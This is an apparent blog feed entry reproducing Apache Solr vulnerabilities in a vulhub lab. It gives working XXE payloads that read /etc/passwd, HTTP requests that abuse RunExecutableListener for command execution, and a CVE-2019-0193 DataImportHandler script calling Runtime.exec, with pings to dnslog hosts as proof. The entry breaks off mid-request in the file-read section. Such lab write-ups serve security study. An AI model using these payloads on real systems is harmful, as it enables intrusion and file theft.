<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>Milkii0的秘密花园 • Posts by &#34;solr, 漏洞复现&#34; tag</title>
    <link href="http://example.com" />
    <updated>2022-06-10T01:10:46.000Z</updated>
    <category term="CodeQL" />
    <category term="codeql, 搭建教程" />
    <category term="web,HTTP" />
    <category term="redis,未授权,漏洞利用" />
    <category term="solr, 漏洞复现" />
    <category term="solr, 代码审计" />
    <category term="前后端分离" />
    <category term="文件上传靶场" />
    <category term="Java反序列化" />
    <category term="ysoserial调试" />
    <category term="木马,汇总" />
    <category term="pikachu,web靶场" />
    <category term="dorabox,靶场练习" />
    <category term="sql注入靶场" />
    <category term="webgoat" />
    <entry>
        <id>http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
        <title>solr漏洞复现</title>
        <link rel="alternate" href="http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
        <content type="html">&lt;h1 id=&#34;solr是什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#solr是什么&#34;&gt;#&lt;/a&gt; solr 是什么&lt;/h1&gt;
&lt;p&gt;Solr 是开源的，基于 Lucene Java 的搜索服务器。&lt;/p&gt;
&lt;p&gt;易于加入到 Web 应用程序中，会生成基于 HTTP 的管理界面。&lt;br&gt;
后台管理界面 Dashboard 仪表盘中，可查看当前 Solr 的版本信息。&lt;br&gt;
(概念详解，移步传送门)&lt;/p&gt;
&lt;h1 id=&#34;环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境&#34;&gt;#&lt;/a&gt; 环境&lt;/h1&gt;
&lt;p&gt;漏洞复现环境均使用 vulhub 中的环境&lt;/p&gt;
&lt;h1 id=&#34;cve-2017-12629-xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2017-12629-xxe&#34;&gt;#&lt;/a&gt; CVE-2017-12629-XXE&lt;/h1&gt;
&lt;h2 id=&#34;影响版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
&lt;p&gt;Apache Solr &amp;lt; 7.1&lt;br&gt;
Apache Lucene &amp;lt; 7.1&lt;/p&gt;
&lt;h2 id=&#34;复现过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
&lt;p&gt;启动环境后打开管理界面：&lt;a href=&#34;http://192.168.77.128:8983/solr/#/&#34;&gt;http://192.168.77.128:8983/solr/#/&lt;/a&gt;&lt;br&gt;
solr-spec 版本：7.0.1，lucene-spec 版本：7.0.1，符合漏洞要求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;bd2a3461fc7bccc9854dd362e359e6c9.png&#34; alt=&#34;bd2a3461fc7bccc9854dd362e359e6c9.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用外部实体读取敏感文件信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用外部实体读取敏感文件信息&#34;&gt;#&lt;/a&gt; 利用外部实体读取敏感文件信息&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;开一个 web 服务，在下面创建一个 1.dtd 文件，文件内容如下&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///etc/passwd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;ent&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;&amp;lt;!ENTITY data SYSTEM &amp;#x27;:%file;&amp;#x27;&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;读取 Linux 下 /etc/passwd 文件信息&lt;br&gt;
引用外部实体&lt;br&gt;
 payload： &lt;code&gt;http://192.168.77.128:8983/solr/demo/select?&amp;amp;q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.77.128%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;amp;wt=xml&amp;amp;defType=xmlparser&lt;/code&gt; &lt;br&gt;
URL 解码后：&lt;br&gt;
 &lt;code&gt;http://192.168.77.128:8983/solr/demo/select?&amp;amp;q=&amp;lt;?xml+version=&amp;quot;1.0&amp;quot;+?&amp;gt;&amp;lt;!DOCTYPE+root[&amp;lt;!ENTITY+%+ext+SYSTEM+&amp;quot;http://192.168.77.128/1.dtd&amp;quot;&amp;gt;%ext;%ent;]&amp;gt;&amp;lt;r&amp;gt;&amp;amp;data;&amp;lt;/r&amp;gt;&amp;amp;wt=xml&amp;amp;defType=xmlparser&lt;/code&gt; &lt;br&gt;
 执行 payload，获取文件信息成功&lt;br&gt;
&lt;img src=&#34;../_resources/7053300facb7c69236631c1d082a1013.png&#34; alt=&#34;7053300facb7c69236631c1d082a1013.png&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;本地dtd读取文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#本地dtd读取文件&#34;&gt;#&lt;/a&gt; 本地 DTD 读取文件&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/83713259&#34;&gt;XXE 之利用本地 DTD 进行文件读取&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;cve-2017-12629-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2017-12629-rce&#34;&gt;#&lt;/a&gt; CVE-2017-12629-RCE&lt;/h1&gt;
&lt;h2 id=&#34;影响版本-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-2&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
&lt;p&gt;Apache Solr &amp;lt; 7.1&lt;br&gt;
Apache Lucene &amp;lt; 7.1&lt;/p&gt;
&lt;h2 id=&#34;复现过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-2&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
&lt;p&gt;触发命令执行的事件有两种：postCommit 和 newSearcher&lt;/p&gt;
&lt;h3 id=&#34;使用newsearcher&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用newsearcher&#34;&gt;#&lt;/a&gt; 使用 newSearcher&lt;/h3&gt;
&lt;p&gt;其中 demo 为存在的 core 名称&lt;br&gt;
数据包：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;add-listener&amp;quot; : &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;event&amp;quot;:&amp;quot;newSearcher&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;name&amp;quot;:&amp;quot;newlistener1&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;class&amp;quot;:&amp;quot;solr.RunExecutableListener&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;exe&amp;quot;:&amp;quot;ping&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;dir&amp;quot;:&amp;quot;/usr/bin/&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;args&amp;quot;:[&amp;quot;3pqsrm.dnslog.cn&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;94b6a5f1b4ac9063e66287dcb8c4a904.png&#34; alt=&#34;94b6a5f1b4ac9063e66287dcb8c4a904.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;1ad6af042c22a35b1a3f512ecdded65b.png&#34; alt=&#34;1ad6af042c22a35b1a3f512ecdded65b.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;使用postcommit&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用postcommit&#34;&gt;#&lt;/a&gt; 使用 postCommit&lt;/h3&gt;
&lt;p&gt;数据包 1：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;add-listener&amp;quot; : &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;event&amp;quot;:&amp;quot;postCommit&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;name&amp;quot;:&amp;quot;newlistener3&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;class&amp;quot;:&amp;quot;solr.RunExecutableListener&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;exe&amp;quot;:&amp;quot;ping&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;dir&amp;quot;:&amp;quot;/usr/bin/&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;args&amp;quot;:[&amp;quot;3pqsrm.dnslog.cn&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发送该请求后一直没有返回数据，取消重发会回显该 name 已经存在，所以发送第二个数据包&lt;br&gt;
&lt;img src=&#34;2127408f02166332e7024113d04771c7.png&#34; alt=&#34;2127408f02166332e7024113d04771c7.png&#34;&gt;&lt;br&gt;
 数据包 2 (数据随便输)：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/update HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&amp;#123;&amp;quot;id&amp;quot;:&amp;quot;test&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;fd55bbc422425d1cc140a4b9c47bb275.png&#34; alt=&#34;fd55bbc422425d1cc140a4b9c47bb275.png&#34;&gt;&lt;br&gt;
 更新后发现两条记录都在（之前因为没有返回数据又试了一次）&lt;br&gt;
&lt;img src=&#34;87bd83e9378424bd1f9371d9d213a4c8.png&#34; alt=&#34;87bd83e9378424bd1f9371d9d213a4c8.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;cve-2019-0193&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2019-0193&#34;&gt;#&lt;/a&gt; CVE-2019-0193&lt;/h1&gt;
&lt;h2 id=&#34;影响版本-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-3&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
&lt;p&gt;Apache solr &amp;lt; 8.2.0&lt;/p&gt;
&lt;h2 id=&#34;复现过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-3&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
&lt;p&gt;在 Apache solr 的可选模块 DatalmportHandler 中的 DIH 配置是可以包含脚本，因此存在安全隐患，在 apache solr &amp;lt; 8.2.0 版本之前 DIH 配置中 dataconfig 可以被用户控制&lt;/p&gt;
&lt;p&gt;vulhub 环境下，进入后会让我们新建一个 core&lt;br&gt;
&lt;img src=&#34;ddc393bc282026e3dab3eda7d12be543.png&#34; alt=&#34;ddc393bc282026e3dab3eda7d12be543.png&#34;&gt;&lt;br&gt;
 我们需要在服务器中新建，这里新建会报错找不到配置文件&lt;br&gt;
新建 test core 命令&lt;br&gt;
 &lt;code&gt;docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db &lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;4408b56e4ba62cde34034ac2e758e594.png&#34; alt=&#34;4408b56e4ba62cde34034ac2e758e594.png&#34;&gt;&lt;br&gt;
 刷新页面即可看见新建的 core&lt;br&gt;
 根据以下步骤进行代码执行&lt;br&gt;
&lt;img src=&#34;f3b7b2eac45cbc2012a1e0645496bc1f.png&#34; alt=&#34;f3b7b2eac45cbc2012a1e0645496bc1f.png&#34;&gt;&lt;br&gt;
exp：&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dataConfig&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dataSource&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;URLDataSource&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;handlebars&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;          function poc()&amp;#123; java.lang.Runtime.getRuntime().exec(&amp;quot;ping 0ytihf.dnslog.cn&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;  ]]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;document&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;entity&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;stackoverflow&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;url&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;https://stackoverflow.com/feeds/tag/solr&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;processor&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;XPathEntityProcessor&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;forEach&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/feed&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;transformer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;script:poc&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;document&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dataConfig&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行成功后，上方会出现绿色修勾勾&lt;br&gt;
&lt;img src=&#34;63a1299f3a6105014fe6ca0d077857d7.png&#34; alt=&#34;63a1299f3a6105014fe6ca0d077857d7.png&#34;&gt;&lt;br&gt;
 命令执行成功&lt;br&gt;
&lt;img src=&#34;c7aa99cb57448a243367095f5b1cd1af.png&#34; alt=&#34;c7aa99cb57448a243367095f5b1cd1af.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;remote-streaming-fileread任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#remote-streaming-fileread任意文件读取&#34;&gt;#&lt;/a&gt; Remote-Streaming-Fileread（任意文件读取）&lt;/h1&gt;
&lt;h2 id=&#34;复现过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-4&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;获取 cores&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET 